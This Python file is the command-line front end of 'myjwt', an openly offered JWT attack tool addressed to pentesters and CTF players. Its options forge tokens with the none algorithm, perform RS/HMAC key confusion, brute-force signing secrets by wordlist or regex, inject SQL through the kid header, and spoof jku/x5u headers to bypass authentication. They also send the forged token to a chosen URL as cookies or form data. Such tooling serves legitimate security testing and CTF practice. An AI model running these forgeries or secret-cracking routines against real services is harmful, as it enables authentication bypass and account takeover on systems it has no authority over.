"""
Cli Package
"""

import json
import sys
from json import JSONDecodeError
from typing import Any

import click
import exrex
import requests

from myjwt import __commit__, __version__
from myjwt.modify_jwt import add_header, add_payload, change_alg, change_payload, signature
from myjwt.user_interface import user_interface  # type: ignore
from myjwt.utils import HEADER, SIGNATURE, copy_to_clipboard, encode_jwt, is_valid_jwt, jwt_to_json
from myjwt.variables import (
    CHECK_DOCS,
    CRACKED,
    INVALID_SIGNATURE,
    NEW_JWT,
    NOT_CRAKED,
    NOT_VALID_JWT,
    VALID_COOKIES,
    VALID_DATA,
    VALID_HEADER,
    VALID_PAYLOAD,
    VALID_PAYLOAD_JSON,
    VALID_SIGNATURE,
)
from myjwt.vulnerabilities import (
    bruteforce_wordlist,
    confusion_rsa_hmac,
    inject_sql_kid,
    jku_vulnerability,
    print_decoded,
    send_jwt_to_url,
    x5u_vulnerability,
)

CONTEXT_SETTINGS = {"help_option_names": ["-h", "--help"]}


@click.command(context_settings=CONTEXT_SETTINGS)
@click.version_option(
    __version__,
    message=f"myjwt, version: {__version__}, commit: {__commit__}\nFull documentation: https://myjwt.readthedocs.io/",
)
@click.argument("jwt")
# modify your jwt
@click.option(
    "--full-payload",
    help="New payload for your jwt.Json format Required.",
)
@click.option(
    "--add-header",
    "-h",
    help="Add a new key, value to your jwt header, if key is present old value will be replaced.Format: key=value.",
    multiple=True,
)
@click.option(
    "--add-payload",
    "-p",
    help="Add a new key, value to your jwt payload, if key is present old value will be replaced.Format: key=value.",
    multiple=True,
)
# signature
@click.option("--sign", help="Sign Your jwt with key given.")
@click.option("--verify", help="verify your key.")
# vulnerabilities
@click.option(
    "--none-vulnerability",
    "-none",
    is_flag=True,
    help="Check None Alg vulnerability.",
)
@click.option(
    "--hmac",
    type=click.Path(exists=True),
    help="Check RS/HMAC Alg vulnerability.",
)
@click.option(
    "--bruteforce",
    type=click.Path(exists=True),
    help="Bruteforce to guess the secret used to sign the token.",
)
@click.option(
    "--crack",
    "-c",
    help="regex to iterate all string possibilities to guess the secret used to sign the token.",
)
@click.option("--kid", help="Kid Injection sql")
@click.option("--jku", help="Jku Header to bypass authentication")
@click.option("--x5u", help="X5u Header to bypass authentication")
@click.option("--crt", help="For x5cHeader, force crt file")
@click.option(
    "--key",
    help="For jku or x5c Header, force private key to your key file",
)
@click.option("--file", help="For jku Header and x5u Header, force file name")
# print
@click.option("--print", is_flag=True, help="Print Decoded JWT")
# url
@click.option("-u", "--url", help="Url to send your jwt.")
@click.option(
    "-m",
    "--method",
    help="Method use for send request to url.(Default GET).",
    default="GET",
)
@click.option(
    "-d",
    "--data",
    help="Data send to your url.Format: key=value. if value = MY_JWT value will be replace by new jwt.",
    multiple=True,
)
@click.option(
    "-c",
    "--cookies",
    help="Cookies to send to your url.Format: key=value. if value = MY_JWT value will be replace by new jwt.",
    multiple=True,
)
def myjwt_cli(jwt: str, **kwargs: Any) -> None:
    """
    \b
    This cli is for pentesters, CTF players, or dev.
    You can modify your jwt, sign, inject ,etc...
    Full documentation is at http://myjwt.readthedocs.io.
    If you see problems or enhancement send an issue.I will respond as soon as possible.
    Enjoy :)
    All new jwt will be copy to the clipboard.
    \f

    Parameters
    ----------
    jwt: str
        your jwt
    kwargs: Dict
        all option value
    """
    if not is_valid_jwt(jwt):
        sys.exit(NOT_VALID_JWT)

    # detect if some options are here
    # if no option detected print user_interface
    interface_mode = True
    for option in kwargs.values():
        if not (option is None or option == () or not option or option == "GET"):
            interface_mode = False
    if interface_mode:
        user_interface(jwt)
        sys.exit()

    if kwargs["bruteforce"]:
        jwt_json = jwt_to_json(jwt)
        if "HS" not in jwt_json[HEADER]["alg"]:
            sys.exit(CHECK_DOCS)
        key = bruteforce_wordlist(jwt, kwargs["bruteforce"])
        if key == "":
            sys.exit(NOT_CRAKED)
        else:
            copy_to_clipboard(key)
            click.echo(CRACKED + key)
            if not kwargs["add_header"] and not kwargs["add_payload"] and not kwargs["full_payload"]:
                sys.exit()

    if kwargs["add_payload"]:
        payload_dict = {}
        for payload in kwargs["add_payload"]:
            new_str = payload.split("=")
            if len(new_str) != 2:
                sys.exit(VALID_PAYLOAD)
            payload_dict[new_str[0]] = new_str[1]
        jwt_json = add_payload(jwt_to_json(jwt), payload_dict)
        jwt = encode_jwt(jwt_json) + "." + jwt_json[SIGNATURE]

    if kwargs["add_header"]:
        header_dict = {}
        for header in kwargs["add_header"]:
            new_str = header.split("=")
            if len(new_str) != 2:
                sys.exit(VALID_HEADER)
            header_dict[new_str[0]] = new_str[1]
        jwt_json = add_header(jwt_to_json(jwt), header_dict)
        jwt = encode_jwt(jwt_json) + "." + jwt_json[SIGNATURE]

    if kwargs["full_payload"]:
        try:
            jwt_json = change_payload(
                jwt_to_json(jwt),
                json.loads(kwargs["full_payload"]),
            )
            jwt = encode_jwt(jwt_json) + "." + jwt_json[SIGNATURE]
        except JSONDecodeError:
            sys.exit(VALID_PAYLOAD_JSON)
    if kwargs["x5u"]:
        jwt = x5u_vulnerability(
            jwt,
            url=kwargs["x5u"],
            pem=kwargs["key"],
            crt=kwargs["crt"],
            file=kwargs["file"],
        )
        copy_to_clipboard(jwt)
        click.echo(NEW_JWT + jwt)
    if kwargs["jku"]:
        jwt = jku_vulnerability(
            jwt,
            kwargs["jku"],
            kwargs["file"],
            kwargs["key"],
        )
        copy_to_clipboard(jwt)
        click.echo(NEW_JWT + jwt)
        click.echo(
            f"Please run python -m http.server --bind {kwargs['jku']} .Before send your jwt",
        )
    if kwargs["kid"]:
        jwt = inject_sql_kid(jwt, kwargs["kid"])
        if not kwargs["sign"]:
            copy_to_clipboard(jwt)
            click.echo(NEW_JWT + jwt)
    if kwargs["hmac"]:
        jwt = confusion_rsa_hmac(jwt, kwargs["hmac"])
        copy_to_clipboard(jwt)
        click.echo(NEW_JWT + jwt)

    if kwargs["none_vulnerability"]:
        jwt_json = change_alg(jwt_to_json(jwt), "none")
        jwt = encode_jwt(jwt_json) + "."
        copy_to_clipboard(jwt)
        click.echo(NEW_JWT + jwt)
    if kwargs["sign"]:
        jwt_json = jwt_to_json(jwt)
        if "HS" not in jwt_json[HEADER]["alg"]:
            sys.exit(CHECK_DOCS)
        jwt = signature(jwt_json, kwargs["sign"])
        copy_to_clipboard(jwt)
        click.echo(NEW_JWT + jwt)
    if kwargs["verify"]:
        jwt_json = jwt_to_json(jwt)
        if "HS" not in jwt_json[HEADER]["alg"]:
            sys.exit(CHECK_DOCS)
        new_jwt = signature(jwt_json, kwargs["verify"])
        click.echo(
            VALID_SIGNATURE if new_jwt.split(".")[2] == jwt.split(".")[2] else INVALID_SIGNATURE,
        )
    if kwargs["crack"]:
        jwt_json = jwt_to_json(jwt)
        if "HS" not in jwt_json[HEADER]["alg"]:
            sys.exit(CHECK_DOCS)

        all_string = list(exrex.generate(kwargs["crack"]))
        click.echo(
            kwargs["crack"] + " have " + str(len(all_string)) + " possibilities",
        )
        with click.progressbar(
            all_string,
            label="Keys",
            length=len(all_string),
        ) as bar:
            for key in bar:
                new_jwt = signature(jwt_json, key)
                if new_jwt.split(".")[2] == jwt.split(".")[2]:
                    copy_to_clipboard(key)
                    sys.exit("Key found: " + key)
            sys.exit(INVALID_SIGNATURE)
    if kwargs["url"]:
        data_dict = {}
        for d in kwargs["data"]:
            new_str = d.split("=")
            if len(new_str) != 2:
                sys.exit(VALID_DATA)
            if new_str[1] == "MY_JWT":
                data_dict[new_str[0]] = jwt
            else:
                data_dict[new_str[0]] = new_str[1]

        cookies_dict = {}
        for cookie in kwargs["cookies"]:
            new_str = cookie.split("=")
            if len(new_str) != 2:
                sys.exit(VALID_COOKIES)
            if new_str[1] == "MY_JWT":
                cookies_dict[new_str[0]] = jwt
            else:
                cookies_dict[new_str[0]] = new_str[1]
        try:
            response = send_jwt_to_url(
                kwargs["url"],
                kwargs["method"],
                data_dict,
                cookies_dict,
                jwt,
            )
            click.echo(response.text)
        except requests.exceptions.ConnectionError:
            sys.exit("Connection Error. Verify your url.")
    if kwargs["print"]:
        copy_to_clipboard(jwt)
        print_decoded(jwt)

    if (
        not kwargs["none_vulnerability"]
        and not kwargs["hmac"]
        and not kwargs["bruteforce"]
        and not kwargs["sign"]
        and not kwargs["verify"]
        and not kwargs["jku"]
        and not kwargs["x5u"]
        and not kwargs["print"]
    ):
        copy_to_clipboard(jwt)
        click.echo(NEW_JWT + jwt)
    sys.exit()


if __name__ == "__main__":
    myjwt_cli()
